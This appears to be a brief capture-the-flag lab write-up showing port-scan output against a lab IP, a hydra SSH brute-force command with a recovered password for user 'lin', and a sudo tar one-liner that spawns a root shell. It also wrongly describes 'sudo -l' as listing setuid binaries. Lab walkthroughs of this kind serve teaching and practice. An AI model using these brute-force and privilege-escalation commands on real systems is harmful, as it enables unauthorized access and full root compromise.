...
`rustscan -a $(cat ip) -- -sC -sV -v -oN nmap.txt $(cat ip)`

```
# Nmap 7.80 scan initiated Mon Jan 24 15:55:16 2022 as: nmap -vvv -p 21,22,80 -sC -sV -v -oN nmap.txt 10.10.16.43 10.10.16.43
Nmap scan report for 10.10.16.43
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-01-24 15:55:17 +06 for 7s
...
Nmap scan report for 10.10.16.43
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-01-24 15:55:17 +06 for 40s
...
# Nmap done at Mon Jan 24 15:55:57 2022 -- 2 IP addresses (2 hosts up) scanned in 40.58 seconds
```
...
- `hydra -l lin -P locks.txt $(cat ip) ssh -V`
- **RedDr4gonSynd1cat3** is the password for lin
- `ssh lin@$(cat ip)`

## Privilage Escalation

- `sudo -l` Shows all the setuid binaries
- `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` spawns a root shell
